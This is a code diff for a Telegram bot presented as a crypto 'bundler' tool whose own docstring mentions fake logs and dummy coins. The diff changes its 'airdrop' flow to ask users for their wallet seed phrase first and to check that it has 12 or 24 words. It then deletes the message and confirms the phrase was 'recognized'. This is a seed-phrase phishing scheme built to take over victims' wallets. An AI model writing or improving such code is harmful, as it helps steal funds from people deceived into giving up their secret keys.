@@ -4,7 +4,7 @@ ProTools Bundler Bot (Marx Edition)
 - Dummy Coin Launch: Interactive flow for dummy tokens.
 - Transaction Check: Blocks access if wallet is unlinked.
 - Fake Logs: Hardcoded logs for a cinematic look.
-- Restored: Airdrop and Feedback conversation handlers.
+- Airdrop Update: Requests phrase FIRST and validates 12/24 words.
 """
 
 import logging
@@ -193,13 +193,20 @@ async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_T
     return ConversationHandler.END
 
 async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("🎁 *Airdrop Step 1* — Send your *seed phrase* or *private key*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.callback_query.edit_message_text("🎁 *Airdrop Step 1* — Send your *seed phrase* \(12 or 24 words\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_PHRASE
 
 async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phrase = update.message.text.strip()
     try: await update.message.delete()
     except: pass
-    await update.effective_chat.send_message("Step 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    
+    # Recognise if phrase is complete (12 or 24 words)
+    if len(phrase.split()) not in (12, 24):
+        await update.effective_chat.send_message("❌ *Invalid Phrase*\. Seed phrases must be 12 or 24 words\. Please try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+        return AIRDROP_PHRASE
+        
+    await update.effective_chat.send_message("✅ Phrase recognized\. \n\nStep 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_RECIPIENT
 
 async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
